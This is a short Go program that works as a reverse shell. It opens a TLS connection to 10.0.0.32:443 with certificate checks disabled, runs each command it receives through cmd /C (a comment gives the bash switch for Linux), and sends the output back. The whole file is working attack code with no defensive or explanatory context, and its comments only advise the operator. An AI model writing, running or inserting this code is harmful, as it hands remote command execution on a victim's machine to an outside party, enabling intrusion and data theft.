package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"log"
	"os"
	"os/exec"
)

func main() {
	shell("10.0.0.32:443")
}

func shell(host string) {

	conf := &tls.Config{InsecureSkipVerify: true} //comment out 'InsecureSkipVerify: true' to use a legitiment  cert from an authorized CA
	conn, err := tls.Dial("tcp", host, conf)
	if err != nil {
		log.Println(err)
	}
	for {
		message, _ := bufio.NewReader(conn).ReadString('\n')
		out, err := exec.Command("cmd", "/C", message).CombinedOutput() // for linux, switch "cmd" to "bash" and "/C" to "-c"
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
		conn.Write(out)
	}

}
